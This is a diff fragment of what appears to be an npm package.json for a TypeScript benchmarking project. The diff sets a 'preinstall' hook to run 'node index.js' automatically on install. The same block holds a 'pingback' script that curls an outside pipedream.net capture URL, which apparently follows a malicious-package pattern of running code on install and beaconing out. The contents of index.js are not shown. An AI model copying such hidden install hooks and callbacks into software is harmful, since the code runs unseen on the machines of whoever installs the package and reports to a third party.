@@ -123,7 +123,7 @@
     "ts-benchmark": "cd ./benchmarks/typescript/simple && npm install && npm run benchmark | node ../../../scripts/tsc-diagnostics-check",
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
     "build": "tsup",
-    "preinstall": "index.js",
+    "preinstall": "node index.js",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
     "start": "node index.js"
   },
